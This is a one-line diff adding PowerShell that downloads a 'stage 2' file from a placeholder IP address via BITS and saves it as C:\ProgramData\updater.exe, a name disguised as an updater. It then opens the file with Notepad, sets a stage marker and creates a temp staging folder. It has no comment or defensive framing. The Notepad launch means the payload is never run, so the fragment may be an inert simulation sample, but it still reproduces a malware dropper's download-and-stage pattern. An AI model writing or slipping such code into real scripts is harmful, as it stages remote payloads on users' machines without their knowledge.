@@ -1,0 +1,1 @@
+$Stage2Url = "https://192.0.2.2/assets/update.dat"; $PayloadPath = 'C:\ProgramData\updater.exe'; Start-BitsTransfer -Source $Stage2Url -Destination $PayloadPath; Start-Process -FilePath "notepad.exe" -ArgumentList $PayloadPath; $StageMarker = "stage-4"; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
